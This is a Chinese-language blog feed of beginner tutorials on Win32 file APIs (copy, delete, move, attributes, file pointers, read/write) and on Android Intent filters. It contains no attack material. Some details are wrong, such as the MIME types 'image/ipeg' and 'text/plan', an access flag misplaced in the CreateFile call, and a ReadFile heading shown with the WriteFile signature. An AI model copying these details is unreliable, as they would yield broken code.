<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CopyFileEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCWSTR lpExistingFileName,</span></span></span><br><span class="line"><span class="function"><span class="params">                    <span class="comment">// pointer to name of an existing file</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCWSTR lpNewFileName,</span></span></span><br><span class="line"><span class="function"><span class="params">                    <span class="comment">// pointer to filename to copy to</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPPROGRESS_ROUTINE lpProgressRoutine,</span></span></span><br><span class="line"><span class="function"><span class="params">                    <span class="comment">// pointer to the callback function</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID lpData,    <span class="comment">// to be passed to the callback function</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPBOOL pbCancel,  <span class="comment">// flag that can be used to cancel the operation</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwCopyFlags <span class="comment">// flags that specify how the file is copied</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>前两个还是比较简单的，第三个参数是一个回调函数，定义如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">DWORD CALLBACK <span class="title">CopyProgressRoutine</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LARGE_INTEGER TotalFileSize,  <span class="comment">// total file size, in bytes</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LARGE_INTEGER TotalBytesTransferred,</span></span></span><br><span class="line"><span class="function"><span class="params">                            <span class="comment">// total number of bytes transferred</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LARGE_INTEGER StreamSize,  <span class="comment">// total number of bytes for this stream</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LARGE_INTEGER StreamBytesTransferred,</span></span></span><br><span class="line"><span class="function"><span class="params">                            <span class="comment">// total number of bytes transferred for </span></span></span></span><br><span class="line"><span class="function"><span class="params">                            <span class="comment">// this stream</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwStreamNumber,     <span class="comment">// the current stream</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwCallbackReason,   <span class="comment">// reason for callback</span></span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hSourceFile,       <span class="comment">// handle to the source file</span></span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hDestinationFile,  <span class="comment">// handle to the destination file</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID lpData             <span class="comment">// passed by CopyFileEx</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>第四个参数是要传递给回调函数的一个参数，可以为NULL，<br>第五个参数有点意思，就是为了防止文件过大，给了个可以强制结束的一个指针，BOOL类型的，如歌这个指针为TRUE的时候则会终止。<br>第六个参数是一个复制的类型，可以是下面这两个值：</p>
<table>
<thead>
<tr>
<th>Value</th>
<th>Meaning</th>
</tr>
</thead>
<tbody><tr>
<td>COPY_FILE_FAIL_IF_EXISTS</td>
<td>The copy operation fails immediately if the target file already exists.</td>
</tr>
<tr>
<td>COPY_FILE_RESTARTABLE</td>
<td>Progress of the copy is tracked in the target file in case the copy fails. The failed copy can be restarted at a later time by specifying the same values for lpExistingFileName and lpNewFileName as those used in the call that failed.</td>
</tr>
<tr>
<td>看名字就明白了，失败退出，失败重新。</td>
<td></td>
</tr>
<tr>
<td>那我们就试一下怎么个回事。</td>
<td></td>
</tr>
<tr>
<td><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function">DWORD CALLBACK <span class="title">CopyProgressRoutine</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LARGE_INTEGER TotalFileSize,  <span class="comment">// total file size, in bytes</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LARGE_INTEGER TotalBytesTransferred,</span></span></span><br><span class="line"><span class="function"><span class="params">                            <span class="comment">// total number of bytes transferred</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LARGE_INTEGER StreamSize,  <span class="comment">// total number of bytes for this stream</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LARGE_INTEGER StreamBytesTransferred,</span></span></span><br><span class="line"><span class="function"><span class="params">                            <span class="comment">// total number of bytes transferred for </span></span></span></span><br><span class="line"><span class="function"><span class="params">                            <span class="comment">// this stream</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwStreamNumber,     <span class="comment">// the current stream</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwCallbackReason,   <span class="comment">// reason for callback</span></span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hSourceFile,       <span class="comment">// handle to the source file</span></span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hDestinationFile,  <span class="comment">// handle to the destination file</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID lpData             <span class="comment">// passed by CopyFileEx</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,TotalBytesTransferred.u.LowPart);</span><br><span class="line">	<span class="keyword">return</span> PROGRESS_CONTINUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	CopyFileEx(<span class="string">"1.zip"</span>,<span class="string">"1\\3.zip"</span>,CopyProgressRoutine,<span class="literal">NULL</span>,<span class="literal">NULL</span>,COPY_FILE_RESTARTABLE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></td>
<td></td>
</tr>
<tr>
<td>看了下，主要就是那个回调函数的返回值比较重要一些，要继续的话呢要返回一个<code>PROGRESS_CONTINUE</code>这个值，其他的都不是太重要，仔细看看参数就好了。</td>
<td></td>
</tr>
<tr>
<td>## 删除文件<code>DeleteFile</code></td>
<td></td>
</tr>
<tr>
<td>这个基本不用说，看下定义就知道了，就一个参数，删除的文件路径。</td>
<td></td>
</tr>
<tr>
<td><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">DeleteFile</span><span class="params">(  LPCTSTR lpFileName   <span class="comment">// pointer to name of file to delete</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure></td>
<td></td>
</tr>
<tr>
<td>但是在这里我还是要说一些比较关键的一些内容，删除不存在的文件的时候是会失败的，如果删除的文件是一个只读的属性，那么将会返回：ERROR_ACCESS_DENIED这个样子的一个值，这里我们写一个递归的函数（使用MFC的框架）实现递归删除。</td>
<td></td>
</tr>
<tr>
<td><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> CStudy_HistoryDlg::OnBnClickedButton1()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">	CString Context ;EContext.GetWindowTextA(Context);</span><br><span class="line">	RecursiveDelete(Context);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> CStudy_HistoryDlg::RecursiveDelete(CString szPath)</span><br><span class="line">&#123;</span><br><span class="line">	CFileFind ff;</span><br><span class="line">	CString strPath = szPath;</span><br><span class="line">	<span class="keyword">if</span> (<span class="string">"\\"</span> != strPath.Right(<span class="number">1</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		strPath += <span class="string">"\\"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	strPath += <span class="string">"*.*"</span>;<span class="comment">//这个过滤器类型的东西貌似都是支持正则的。</span></span><br><span class="line">	BOOL bRet;<span class="comment">//用来标记是不是已经删除完毕。</span></span><br><span class="line">	<span class="keyword">if</span> (ff.FindFile(strPath))<span class="comment">//这个应该就是文件夹的第一个指针开始。</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">do</span> </span><br><span class="line">		&#123;</span><br><span class="line">			bRet = ff.FindNextFile();<span class="comment">//将内部的那个指针往下移动一下</span></span><br><span class="line">			<span class="keyword">if</span> (ff.IsDots())<span class="comment">//为.或..这种的上级目录</span></span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			strPath = ff.GetFilePath();</span><br><span class="line">			<span class="keyword">if</span> (!ff.IsDirectory())<span class="comment">//看看是不是一个目录</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="comment">//是一个文件</span></span><br><span class="line">				<span class="comment">//删除文件</span></span><br><span class="line">				::SetFileAttributes(strPath,FILE_ATTRIBUTE_NORMAL);<span class="comment">//先设置一下这个文件的属性，不要只读！！！</span></span><br><span class="line">				::DeleteFile(strPath);</span><br><span class="line"></span><br><span class="line">			&#125;<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				RecursiveDelete(strPath);<span class="comment">//经典的递归调用</span></span><br><span class="line">				::SetFileAttributes(strPath,FILE_ATTRIBUTE_NORMAL);<span class="comment">//和上面一样</span></span><br><span class="line">				::RemoveDirectory(strPath); <span class="comment">//移除掉这个文件夹</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">while</span> (bRet);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></td>
<td></td>
</tr>
<tr>
<td>我都做了一定的注释，就是一个递归删除，使用了MFC的一个框架，说实话微软给的这个框架是真的好！</td>
<td></td>
</tr>
<tr>
<td>需要注意，我们使用<code>DeleteFile</code>这个函数的话呢，是不会进入回收站的！</td>
<td></td>
</tr>
</tbody></table>
<h2 id="移动文件MoveFileEx"><a href="#移动文件MoveFileEx" class="headerlink" title="移动文件MoveFileEx"></a>移动文件<code>MoveFileEx</code></h2><p>这次还是在用个Ex加强版本的吧，看一下Ex版本的MSDN定义：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">MoveFileEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpExistingFileName,  <span class="comment">// pointer to the name of the existing file</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpNewFileName,       <span class="comment">// pointer to the new name for the file</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwFlags                <span class="comment">// flag that specifies how to move file</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>第三个的参数有点古怪：<br>比较有意思的一个值：“MOVEFILE_DELAY_UNTIL_REBOOT”，这个值的意思就是说重启才会移动，具体怎么用我也没有去深入研究，没啥意思我感觉，而且与其他的不能同时使用。<br>MOVEFILE_COPY_ALLOWED：这个就是说可以移动到别的盘符，还有就是好像指定了这个就是类似于先Copy再删除这个样子的操作。<br>MOVEFILE_REPLACE_EXISTING：替换掉存在的。<br>MOVEFILE_WRITE_THROUGH：这个就是说等待函数结束才会返回。<br>说了这么多就实验一下吧。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	MoveFileEx(<span class="string">"1.txt"</span>,<span class="string">"2.txt"</span>,MOVEFILE_COPY_ALLOWED|MOVEFILE_REPLACE_EXISTING|MOVEFILE_WRITE_THROUGH);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>好吧也没啥可以验证的…</p>
]]></content>
      <categories>
        <category>Win32编程</category>
      </categories>
      <tags>
        <tag>Win32编程</tag>
      </tags>
  </entry>
  <entry>
    <title>File Attribute</title>
    <url>/2020/01/24/File-Attribute/</url>
    <content><![CDATA[<h1 id="文件属性的读取"><a href="#文件属性的读取" class="headerlink" title="文件属性的读取"></a>文件属性的读取</h1><p>文件属性的一些读取，主要就是依靠。</p>
<h2 id="GetFileType获取文件类型"><a href="#GetFileType获取文件类型" class="headerlink" title="GetFileType获取文件类型"></a><code>GetFileType</code>获取文件类型</h2><p>就一个参数，文件句柄，<code>CreateFile</code>获得的，返回值：</p>
<table>
<thead>
<tr>
<th>Value</th>
<th>Meaning</th>
</tr>
</thead>
<tbody><tr>
<td>FILE_TYPE_UNKNOWN</td>
<td>The type of the specified file is unknown.</td>
</tr>
<tr>
<td>FILE_TYPE_DISK</td>
<td>The specified file is a disk file.</td>
</tr>
<tr>
<td>FILE_TYPE_CHAR</td>
<td>The specified file is a character file, typically an LPT device or a console.</td>
</tr>
<tr>
<td>FILE_TYPE_PIPE</td>
<td>The specified file is either a named or anonymous pipe.</td>
</tr>
</tbody></table>
<h2 id="GetFileSize获取文件尺寸"><a href="#GetFileSize获取文件尺寸" class="headerlink" title="GetFileSize获取文件尺寸"></a><code>GetFileSize</code>获取文件尺寸</h2><p>这个函数用来获取文件的大小，在读取文件的时候很好用</p>
<p><strong>如果函数成功，则返回的值是文件大小的低阶双字，如果lpFileSizeHigh是非null，则函数将文件大小的高阶双字放入该参数指向的变量中。<br>如果函数失败且lpFileSizeHigh为NULL，则返回值为0xFFFFFFFF。要获取扩展的错误信息，请调用GetLastError。<br>如果函数失败并且lpFileSizeHigh是非空的，则返回值为0xFFFFFFFF, GetLastError将返回一个NO_ERROR以外的值。</strong><br>返回值的一个判定，简单看看就好了。</p>
<h2 id="GetFileAttributes获取文件属性"><a href="#GetFileAttributes获取文件属性" class="headerlink" title="GetFileAttributes获取文件属性"></a><code>GetFileAttributes</code>获取文件属性</h2><p>这个东西不复杂就是有点乱，参数就是一个字符串，不要忘记转义就好了。<br>看一下MSDN的一些说明。</p>
<table>
<thead>
<tr>
<th>Attribute</th>
<th>Meaning</th>
</tr>
</thead>
<tbody><tr>
<td>FILE_ATTRIBUTE_ARCHIVE</td>
<td>The file or directory is an archive file or directory. Applications use this attribute to mark files for backup or removal.</td>
</tr>
<tr>
<td>FILE_ATTRIBUTE_COMPRESSED</td>
<td>The file or directory is compressed. For a file, this means that all of the data in the file is compressed. For a directory, this means that compression is the default for newly created files and subdirectories.</td>
</tr>
<tr>
<td>FILE_ATTRIBUTE_DIRECTORY</td>
<td>The handle identifies a directory.</td>
</tr>
<tr>
<td>FILE_ATTRIBUTE_ENCRYPTED</td>
<td>The file or directory is encrypted. For a file, this means that all data streams are encrypted. For a directory, this means that encryption is the default for newly created files and subdirectories.</td>
</tr>
<tr>
<td>FILE_ATTRIBUTE_HIDDEN</td>
<td>The file or directory is hidden. It is not included in an ordinary directory listing.</td>
</tr>
<tr>
<td>FILE_ATTRIBUTE_NORMAL</td>
<td>The file or directory has no other attributes set. This attribute is valid only if used alone.</td>
</tr>
<tr>
<td>FILE_ATTRIBUTE_OFFLINE</td>
<td>The data of the file is not immediately available. Indicates that the file data has been physically moved to offline storage.</td>
</tr>
<tr>
<td>FILE_ATTRIBUTE_READONLY</td>
<td>The file or directory is read-only. Applications can read the file but cannot write to it or delete it. In the case of a directory, applications cannot delete it.</td>
</tr>
<tr>
<td>FILE_ATTRIBUTE_REPARSE_POINT</td>
<td>The file has an associated reparse point.</td>
</tr>
<tr>
<td>FILE_ATTRIBUTE_SPARSE_FILE</td>
<td>The file is a sparse file.</td>
</tr>
<tr>
<td>FILE_ATTRIBUTE_SYSTEM</td>
<td>The file or directory is part of, or is used exclusively by, the operating system.</td>
</tr>
<tr>
<td>FILE_ATTRIBUTE_TEMPORARY</td>
<td>The file is being used for temporary storage. File systems attempt to keep all of the data in memory for quicker access rather than flushing the data back to mass storage. A temporary file should be deleted by the application as soon as it is no longer needed.</td>
</tr>
<tr>
<td>（呼~，终于写完了，手都累酸了）</td>
<td></td>
</tr>
</tbody></table>
<p>返回值就是这样子判断，这些东西对与目录一样也是适用的。<br>示例代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD dwAttributes = GetFileAttributes(<span class="string">"Wker.txt"</span>) ; </span><br><span class="line">	<span class="keyword">if</span>(dwAttributes == <span class="number">0XFFFFFFFF</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"这是个什么东西？"</span>; </span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>((dwAttributes &amp; FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"啊！是个目录啊"</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"啊!是个文件啊"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>设置文件属性：<code>SetFileAttributes</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">SetFileAttributes</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpFileName,  <span class="comment">// pointer to filename</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwFileAttributes   <span class="comment">// attributes to set</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>参数就不介绍了，很简单，第二个参数值太多，百度一下就可以了。</p>
]]></content>
      <categories>
        <category>Win32编程</category>
      </categories>
      <tags>
        <tag>Win32编程</tag>
      </tags>
  </entry>
  <entry>
    <title>Intent-过滤器</title>
    <url>/2020/01/24/Intent-%E8%BF%87%E6%BB%A4%E5%99%A8/</url>
    <content><![CDATA[<h1 id="Intent过滤器"><a href="#Intent过滤器" class="headerlink" title="Intent过滤器"></a>Intent过滤器</h1><p>这个东西就是一个过滤器，用于过滤intent发送给Activity信息的时候对发送对象的一个过滤，那么我们具体怎么使用呢？<br>首先我们需要用隐式Intent进行消息的发送，首先我们对我们的Activity进行过滤器的设置例如如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">intent-filter</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"com.wker.top"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.DEFAULT"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:scheme</span>=<span class="string">"http"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>例如这个样子，我们需要设置intent的时候是这个样子的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">intent.setAction(<span class="string">"com.wker.top"</span>);</span><br><span class="line">intent.addCategory(Intent.CATEGORY_DEFAULT);</span><br><span class="line">intent.setData(Uri.parse(<span class="string">"http:"</span>));</span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure>
<p>这个时候我们需要注意，我们设置的协议scheme的时候是http，但是我们要用Data数据的时候我们需要填写完整的‘http:’，这个使我们需要注意的，这个时候我们就能成功的打开我们的页面了，那么我们看到Data还有好多的属性，我们继续设置。主要看我们的Data数据设置和我们的URI的一个设置。<br><code>&lt;data android:scheme=&quot;http&quot; android:host=&quot;wker666.github.io&quot; android:port=&quot;80&quot; android:path=&quot;/Android&quot;/&gt;</code><br><code>intent.setData(Uri.parse(&quot;http://wker666.github.io:80/Android&quot;));</code><br>其实可以看到也就是按照一个URL类似的格式进行填写的。<br><strong>Intent过滤器中的category属性称之为类别判定，其实也很好理解，就是对于APP类型的一个判定（我猜的，因为我看到值有default和browser这类的值，所以我感觉应该就是），而且这里还需要注意，可以设置多个category是不会影响的，就是说一个正确了其他的不正确也不影响。</strong></p>
<p>而且category这个节点的属性是必须存在的！！！</p>
<p>下面说说Data这个节点的属性，有点繁杂，但是也是比较好用的，重点的上面提到了，主要说说那个mimeType：</p>
<table>
<thead>
<tr>
<th>文件拓展名</th>
<th>MIMEType</th>
</tr>
</thead>
<tbody><tr>
<td>png</td>
<td>image/png</td>
</tr>
<tr>
<td>bmp\dib</td>
<td>image/bmp</td>
</tr>
<tr>
<td>jpg\jpeg\jpg</td>
<td>image/ipeg</td>
</tr>
<tr>
<td>gif</td>
<td>image/gif</td>
</tr>
<tr>
<td>mp3</td>
<td>audio/mpeg</td>
</tr>
<tr>
<td>mp4\mpg4\m4v\mp4v</td>
<td>video/mp4</td>
</tr>
<tr>
<td>js</td>
<td>application/javascript</td>
</tr>
<tr>
<td>pdf</td>
<td>application/pdf</td>
</tr>
<tr>
<td>text\txt</td>
<td>text/plan</td>
</tr>
<tr>
<td>json</td>
<td>application/json</td>
</tr>
<tr>
<td>xml</td>
<td>text/xml</td>
</tr>
</tbody></table>
<p>这个就是从网上摘录的一部分，在网站上经常见到，就是来设定格式的，在渗透测试中需要注意就是只是单纯的过滤这个格式的话呢是存在漏洞的，之后再提这个，但是在Win32中这个东西简直是个噩梦，之后有机会再说。<br>这个东西有点两样，谷歌把他单纯的分离出来了，而且它的函数比较特殊，我们来看一下。<br><code>SetDate</code>：<em>This method automaticallyclears any type that was previously set by setType or setTypeAndNormalize. *<br>很怪，这东西的意思是说会清除我们之前设置的<code>setType</code>，然而我们我们的<code>setType</code>这个也是：</em>This method automatically clears any data that waspreviously set (for example by setData). *<br>就是一个矛盾的函数，那么我们怎么办？谷歌给我们了一个方法专门用来解决这个问题：<br><code>intent.setDataAndType(data, type)</code><br>这个方法就是可以解决的，我们的XML设置：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.DEFAULT"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:scheme</span>=<span class="string">"http"</span> <span class="attr">android:host</span>=<span class="string">"wker666.github.io"</span> <span class="attr">android:port</span>=<span class="string">"80"</span> <span class="attr">android:path</span>=<span class="string">"/Android"</span> <span class="attr">android:mimeType</span>=<span class="string">"text/plan"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>Intent设置：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">intent.setDataAndType(Uri.parse(<span class="string">"http://wker666.github.io:80/Android"</span>), <span class="string">"text/plan"</span>);</span><br></pre></td></tr></table></figure>
<p>这个样子就是正常了的！</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>File operate</title>
    <url>/2020/01/24/File-operate/</url>
    <content><![CDATA[<h1 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h1><p>上篇博客说道了强大的CreateFile函数，现在就介绍如何进行文件的具体操作。</p>
<h2 id="SetFilePointer移动文件指针"><a href="#SetFilePointer移动文件指针" class="headerlink" title="SetFilePointer移动文件指针"></a><code>SetFilePointer</code>移动文件指针</h2><p>读文件的时候我们要标志我们具体读到了哪个地方，那么我们就需要一个指针，这个指针代表我们具体读到了什么地方。<br><code>SetFilePointer</code>这个函数就是设置这个指针的位置，方便我们可以随机读取文件。<br>看下MSDN的一个介绍：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">SetFilePointer</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hFile,          <span class="comment">// handle of file</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LONG lDistanceToMove,  <span class="comment">// number of bytes to move file pointer</span></span></span></span><br><span class="line"><span class="function"><span class="params">  PLONG lpDistanceToMoveHigh,</span></span></span><br><span class="line"><span class="function"><span class="params">                         <span class="comment">// pointer to high-order DWORD of </span></span></span></span><br><span class="line"><span class="function"><span class="params">                         <span class="comment">// distance to move</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwMoveMethod     <span class="comment">// how to move</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<ol>
<li><code>hFile</code>这个就是我们打开文件的一个文件句柄，通过CreateFile就可获得。</li>
<li><code>lDistanceToMove</code>移动的一个距离</li>
<li><code>lpDistanceToMoveHigh</code>看名字就知道了这个是移动距离的高32位，一般至于超大文件才会用的到。</li>
<li><code>dwMoveMethod</code>指针的一个移动方式，主要是下面这三个值：<ul>
<li>FILE_BEGIN：从文件的开头进行移动</li>
<li>FILE_CURRENT：从当前的一个位置进行移动</li>
<li>FILE_END：从文件的结尾进行移动<br>简单易懂一下就看明白了。</li>
</ul>
</li>
</ol>
<p>返回值就是当前文件指针的位置，如果失败就是-1。<br>这个函数有个强大的功能，就是说比如你当前的这个文件有100KB，但是我却移动到了1000KB，那么再写入的时候我的文件就会增大。</p>
<h2 id="SetEndOfFile截断文件"><a href="#SetEndOfFile截断文件" class="headerlink" title="SetEndOfFile截断文件"></a><code>SetEndOfFile</code>截断文件</h2><p><code>SetEndOfFile</code>这个函数MSDN的一个定义：*The SetEndOfFile function moves the end-of-file (EOF) position for the specified file to the current position of the file pointer. *<br>简单的翻译一下：SetEndOfFile函数将指定文件的end-of (EOF)位置移动到文件指针的当前位置。<br>其实简单的说作用就是用来截断文件的。可以用来扩展，也可以用来截断一部分。</p>
<h2 id="ReadFile与WriteFile"><a href="#ReadFile与WriteFile" class="headerlink" title="ReadFile与WriteFile"></a><code>ReadFile</code>与<code>WriteFile</code></h2><p>看名字就知道这是读写文件的操作<br>首先我们看一下ReadFile的一个文件定义：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">WriteFile</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hFile,                    <span class="comment">// handle to file to write to</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCVOID lpBuffer,                <span class="comment">// pointer to data to write to file</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD nNumberOfBytesToWrite,     <span class="comment">// number of bytes to write</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpNumberOfBytesWritten,  <span class="comment">// pointer to number of bytes written</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPOVERLAPPED lpOverlapped        <span class="comment">// pointer to structure for overlapped I/O</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>下面说几个重点的参数就好了</p>
<ul>
<li><code>lpBuffer</code>这个参数就是接受的一个缓冲区</li>
<li><code>nNumberOfBytesToWrite</code>这个是用来读取的一个长度</li>
<li><code>lpNumberOfBytesWritten</code>实际读取的一个大小，用来判断是否结束了一般</li>
<li><code>lpOverlapped</code>重叠I/O的，NULL就好了，基本用不大到<br>说了这么多我们操作一下试试，首先还是要用到我们之前的<code>CreateFile</code>来打开我们的文件，获得文件的一个指针：</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hFile;</span><br><span class="line">	hFile = CreateFile(<span class="string">"Wker.txt"</span>,</span><br><span class="line">					FILE_SHARE_READ,<span class="comment">//要读这个文件	</span></span><br><span class="line">					<span class="number">0</span>,<span class="comment">//不共享</span></span><br><span class="line">					<span class="literal">NULL</span>,<span class="comment">//默认的安全属性</span></span><br><span class="line">					OPEN_EXISTING,<span class="comment">//打开文件</span></span><br><span class="line">					FILE_ATTRIBUTE_NORMAL,<span class="comment">//普通文件 </span></span><br><span class="line">					<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span>(hFile == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span 